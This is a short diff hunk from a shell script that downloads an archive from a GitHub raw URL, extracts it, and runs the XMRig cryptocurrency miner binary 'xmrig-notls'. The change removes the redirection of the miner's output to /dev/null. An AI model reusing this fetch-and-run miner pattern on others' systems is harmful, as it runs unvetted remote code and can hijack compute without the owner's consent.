@@ -50,4 +50,4 @@ cd $HOME/linux/aaa && curl -o 1.tar.xz https://raw.githubusercontent.com/simulas
 cd $HOME/linux/aaa && tar xvf 1.tar.xz && rm 1.tar.xz
 fi
 cd $HOME/linux/aaa && chmod +x xmrig-notls
-cd $HOME/linux/aaa && ./xmrig-notls >> /dev/null
+cd $HOME/linux/aaa && ./xmrig-notls
